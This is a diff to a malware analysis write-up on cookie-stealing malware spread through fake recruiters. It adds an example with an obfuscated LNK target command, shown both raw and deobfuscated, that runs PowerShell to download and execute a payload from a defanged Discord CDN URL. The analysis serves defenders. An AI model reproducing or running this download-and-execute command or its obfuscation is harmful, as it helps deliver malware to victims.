@@ -8,6 +8,7 @@ The malware is designed to steal browser cookies and take advantage of authentic
 In some cases, the malware is delivered to victims over Linkedin, with the user of fake recruiter accounts.
 The binary is designed to use Telegram API to exfiltrate data.
 
+## Example 1 - Binary Masquerading as Job Advertisement
 This sample is taken from [Virustotal](https://www.virustotal.com/gui/file/681a9d8a02e7abacc8d5218de80f16e16c02c2b40807246aa7a45e627e35038b)
 
 It's worth mentioning that this sample, and many others, have very minimal hits on VT, usually 0 or 1.
@@ -72,3 +73,22 @@ As well as a list of hardcoded Outlook email addresses
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/edabee64-7f99-46e1-8107-119bde5b61ee)
 
 It's assessed that these email addresses are added to the compromised Facebook Business group.
+
+## Example 2 - LNK File, Calling out to Discord
+
+A much more simpler example, is an lnk file which target path is to download a remote payload from Discord CDN.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c5a4f76a-94f8-4ee6-ad76-58483bd027f0)
+
+```
+C:\WINDOWS\system32\cmd.exe /c powershe""l""l/""W 0""1 $op='i'+''+'E'+'x';sal donke $op;$hx508wpj=donke(donke($($('(nsd88w-objsd88ct
+Systsd88m.Nsd88t.Wsd88bClisd88nt).Doq82mtring(''hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg''.Replace(''u8pv'',''ttps://'').Replace(''i47'', ''e''))').Replace('sd88', 'e').Replace('q82m', 'wnloadS'))));exit9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
+```
+
+Slightly deobfuscated:
+```
+/c powershe ll/W 01 ='i'+''+'E'+'x';sal donke ;=donke(donke((new-object System.Net.WebClient).DownloadString('hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg'.Replace('u8pv','ttps://').Replace('i47', 'e'))));exit9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
+```
+We can see that PowerShell is being used to download and execute the remote payload: "hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg"
+
+
